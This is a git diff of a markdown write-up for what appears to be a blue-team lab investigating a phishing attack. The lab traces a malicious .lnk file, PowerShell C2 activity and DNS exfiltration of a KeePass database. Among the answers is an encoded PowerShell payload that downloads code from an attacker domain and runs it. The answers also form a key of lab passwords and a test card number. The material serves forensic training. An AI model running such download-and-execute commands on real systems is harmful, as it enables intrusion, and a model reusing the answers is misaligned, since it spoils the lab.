@@ -110,17 +110,17 @@ Once the payload from the encrypted archive is extracted, use lnkparse to extrac
 
 **What is the email address used to send the phishing email?**
 
-***Answer: agriffin@bpakcaging.xyz***
+*Answer: agriffin@bpakcaging.xyz*
 
 Refer to the email header from above.
 
 **What is the email address of the victim?**
 
-***Answer: julianne.westcott@hotmail.com***
+*Answer: julianne.westcott@hotmail.com*
 
 **What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?**
 
-***Answer: elasticemail***
+*Answer: elasticemail*
 
 ![image](images/elasticmail.png)
 
@@ -130,15 +130,15 @@ We can copy the content of the email header and use online tool to analyze the c
 
 **What is the name of the file inside the encrypted attachment?**
 
-***Answer: Invoice_20230103.lnk***
+*Answer: Invoice_20230103.lnk*
 
 **What is the password of the encrypted attachment?**
 
-***Answer: Invoice2023!***
+*Answer: Invoice2023!*
 
 **Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?**
 
-***Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==***
+*Answer: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==*
 
 Parse the the malicious file using the tool mentioned.
 
@@ -199,7 +199,7 @@ The following command will filter only the fields in the file which I find helpf
 
 **What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)**
 
-***Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz***
+*Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz*
 
 The command will sort logs based on their timestamps, print values from the selected field of “ScriptBlockText”, sort it and remove duplicated field names.
 
@@ -211,7 +211,7 @@ We see two domains that were being used for hosting a file and acting as a C2 se
 
 **What is the name of the enumeration tool downloaded by the attacker?**
 
-***Answer: Seatbelt***
+*Answer: Seatbelt*
 
 `jq -r '.. | strings | scan("(?i)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+(?:[a-z]{2,})")' powershell.json | sort -u`
 
@@ -221,7 +221,7 @@ Also in the results is an indication that a tool popularly used for enumeration 
 
 **What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.**
 
-***Answer: C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite***
+*Answer: C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite*
 
 Modified the command above but only grepping selected keywords associated with the downloaded binary.
 
@@ -233,13 +233,13 @@ It can be seen that the binary “sq3.exe” was used to download a file named �
 
 **What is the software that uses the file in Q3?**
 
-***Answer: Microsoft Sticky Notes***
+*Answer: Microsoft Sticky Notes*
 
 It can also be observed on the second captured “ScriptBlockText” the location of the software where the files are located.
 
 **What is the name of the exfiltrated file?**
 
-***Answer: protected_data.kdbx**
+*Answer: protected_data.kdbx*
 
 The command that was used previously resulted in very interesting information such as the method used, extension of the file exfiltrated, tool used, and the encoding used.
 
@@ -251,7 +251,7 @@ We can find all the answers for the remaining questions in this task from the re
 
 **What type of file uses the .kdbx file extension?**
 
-***Answer: KeePass***
+*Answer: KeePass*
 
 Searching online would give the type of file that uses the said file extension
 
@@ -259,11 +259,11 @@ Searching online would give the type of file that uses the said file extension
 
 **What is the encoding used during the exfiltration attempt of the sensitive file?**
 
-***Answer: hex***
+*Answer: hex*
 
 **What is the tool used for exfiltration?**
 
-***Answer: nslookup***
+*Answer: nslookup*
 
 <br /><br /><br />
 
@@ -293,7 +293,7 @@ Finally, we can complete the investigation by understanding the network traffic 
 
 **What software is used by the attacker to host its presumed file/payload server?**
 
-***Answer: Python***
+*Answer: Python*
 
 Filter the packet with http and keyword of the URL where the file was hosted.
 
@@ -305,19 +305,19 @@ Follow the TCP stream of the filtered results and we could see in the response s
 
 **What HTTP method is used by the C2 for the output of the commands executed by the attacker?**
 
-***Answer: POST***
+*Answer: POST*
 
 We discovered the method used in the previous task.
 
 **What is the protocol used during the exfiltration activity?**
 
-***Answer: dns***
+*Answer: dns*
 
 We also discovered from the previous task that DNS lookup was used to exfiltrate a file.
 
 **What is the password of the exfiltrated file?**
 
-***Answer: %p9^3!lL^Mz47E2GaT^y***
+*Answer: %p9^3!lL^Mz47E2GaT^y*
 
 In the previous task, there was a “ScriptBlockText” where the binary “sq3.exe” was used to access “plum.sqlite”. It can be also be seen that the attacker was able to retrieve records from the table “NOTE” which may also include credentials and one of them could be that password for the exfiltrated file.
 
@@ -345,7 +345,7 @@ Using “From Decimal” as the recipe, the master password for the exfiltrated 
 
 **What is the credit card number stored inside the exfiltrated file?**
 
-***Answer: 4024007128269551***
+*Answer: 4024007128269551*
 
 Using Wireshark at first, I built a display filter that utilizes the info we got from the previous task: nslookup -q=A. This can be done by going to **"Analyze > Display Filter Expressions"**.
 
@@ -419,7 +419,7 @@ Look around the database until we find the account number being asked.
 
 ![image](images/master_key_3.png)
 
+<br /><br /><br />
 
-
-
+*Credits to @huglertomgaw(igor_sec) of Medium*
 
